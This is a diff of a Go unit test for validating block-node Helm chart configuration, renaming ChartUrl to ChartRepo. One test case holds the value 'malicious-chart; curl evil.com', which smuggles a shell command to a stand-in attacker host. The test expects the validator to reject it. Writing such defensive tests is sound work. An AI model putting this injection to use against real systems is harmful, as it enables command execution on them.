@@ -105,7 +105,7 @@ func TestBlockNodeConfig_Validate(t *testing.T) {
 			config: BlockNodeConfig{
 				Namespace: "block-node-ns",
 				Release:   "my-release",
-				ChartUrl:  "oci://ghcr.io/hiero-ledger/hiero-block-node/block-node-server",
+				ChartRepo: "oci://ghcr.io/hiero-ledger/hiero-block-node/block-node-server",
 				Version:   "0.24.0",
 				Storage: BlockNodeStorage{
 					BasePath: "/mnt/storage",
@@ -134,7 +134,7 @@ func TestBlockNodeConfig_Validate(t *testing.T) {
 		{
 			name: "invalid_chart_with_shell_metacharacters",
 			config: BlockNodeConfig{
-				ChartUrl: "malicious-chart; curl evil.com",
+				ChartRepo: "malicious-chart; curl evil.com",
 			},
 			expectError: true,
 			errorMsg:    "chart reference contains invalid characters",
